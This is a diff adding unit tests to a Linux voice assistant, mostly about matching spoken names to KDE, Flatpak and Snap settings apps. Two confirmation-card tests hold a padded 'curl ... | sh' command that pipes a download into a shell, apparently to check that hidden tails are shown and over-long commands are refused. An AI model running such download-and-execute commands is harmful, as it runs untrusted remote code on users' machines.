@@ -18,7 +18,7 @@ from unittest import mock
 sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
 from tuxistant import apps  # noqa: E402
 from tuxistant.config import DEFAULTS  # noqa: E402
-from tuxistant.gate import APP_SAYS, DECLINED, Ask, Session, Speak  # noqa: E402
+from tuxistant.gate import APP_SAYS, DECLINED, MAX_DETAIL_CHARS, Ask, Session, Speak  # noqa: E402
 from tuxistant.skills import Skills  # noqa: E402
 
 REAL_INSTALLED = apps._installed
@@ -346,6 +346,57 @@ class SettingsPages(NoDesktop):
         self.opens("open system details", "gnome-about-panel.desktop")
         self.opens("system device details", "org.x.DeviceDetails.desktop")
 
+    def kde(self):
+        """As Ubuntu's systemsettings package installs it, shown under GNOME."""
+        self.entries = [e for e in self.entries if e.id != apps.SETTINGS_ID]
+        self.entries += [made(apps.SETTINGS_ID, "Settings"),
+                         made("gnome-system-panel.desktop", "System", shown=False),
+                         made("kdesystemsettings.desktop", "KDE System Settings",
+                              program="systemsettings"),
+                         made("org.kde.kdeconnect.app.desktop", "KDE Connect"),
+                         made("org.kde.kdeconnect.nonplasma.desktop", "KDE Connect Indicator")]
+
+    def test_an_app_named_exactly_what_was_said_beats_the_page(self):
+        self.kde()
+        for name in ("KDE System Settings", "open KDE system settings",
+                     "open the KDE System Settings app"):
+            with self.subTest(name):
+                self.opens(name, "kdesystemsettings.desktop")
+        self.opens("system settings", "gnome-system-panel.desktop")
+        self.opens("settings", apps.SETTINGS_ID)
+
+    def test_the_which_one_reply_leads_to_the_app(self):
+        self.kde()
+        self.assertEqual(self.said("open kde settings"),
+                         "Which one: KDE System Settings, KDE Connect or KDE Connect Indicator?")
+        self.opens("KDE System Settings", "kdesystemsettings.desktop")
+
+    def test_twins_named_with_a_settings_word(self):
+        self.kde()
+        self.entries.append(made("org.kde.systemsettings.desktop", "KDE System Settings",
+                                 "Flatpak"))
+        self.assertEqual(self.said("KDE System Settings"), "There's more than one KDE System "
+                         "Settings: one from the system and a Flatpak. Say system KDE System "
+                         "Settings or Flatpak KDE System Settings.")
+        self.opens("system KDE System Settings", "kdesystemsettings.desktop")
+        self.opens("Flatpak KDE System Settings", "org.kde.systemsettings.desktop")
+        self.opens("system settings", "gnome-system-panel.desktop")
+
+    def test_a_kind_word_the_app_does_not_have_opens_no_page(self):
+        """Only the system copy is installed, so a Flatpak, home or Snap one is answered, not
+        taken for the System page."""
+        self.kde()
+        for name, kind in (("Flatpak KDE System Settings", "a Flatpak"),
+                           ("home KDE System Settings", "one added in your home folder"),
+                           ("KDE System Settings snap", "a Snap"),
+                           ("open the Flatpak KDE System Settings app", "a Flatpak")):
+            with self.subTest(name):
+                self.assertEqual(self.said(name),
+                                 f"The KDE System Settings on this computer isn't {kind}.")
+                self.assertEqual(self.launched, [])
+        self.opens("system KDE System Settings", "kdesystemsettings.desktop")
+        self.opens("flatpak system settings", "gnome-system-panel.desktop")
+
     def test_internet_settings_are_the_network_page(self):
         self.defaults["https"] = "firefox.desktop"
         self.entries.append(made("gnome-network-panel.desktop", "Network", shown=False))
@@ -557,6 +608,22 @@ class Card(NoDesktop):
             with self.subTest(line):
                 self.write_backup(line + "\n")
                 self.assertEqual(self.said("backup now"), apps.FILLS_IN)
+        self.assertEqual(self.launched, [])
+
+    def test_a_long_command_is_shown_whole(self):
+        """The end of a command is where a surprise would be."""
+        command = "sh -c 'echo Syncing" + " ." * 150 + "; curl -s https://example.invalid/x | sh'"
+        self.write_backup(f"Exec={command}\n")
+        self.assertEqual(self.ask().detail.split("\n")[1], f"Runs: {command}")
+
+    def test_a_card_too_long_to_show_whole_is_left_alone(self):
+        long = "x" * MAX_DETAIL_CHARS
+        for line in (f"Exec=sh -c 'echo {long}; curl -s https://example.invalid/x | sh'",
+                     f"Exec=backup-tool\nPath=/srv/{long}",
+                     "Exec=sh -c '" + "\\t" * (MAX_DETAIL_CHARS // 2) + "'"):
+            with self.subTest(line[:20]):
+                self.write_backup(line + "\n")
+                self.assertEqual(self.said("backup now"), apps.TOO_LONG)
         self.assertEqual(self.launched, [])
 
     def test_files_addresses_and_percent_signs_still_get_the_card(self):
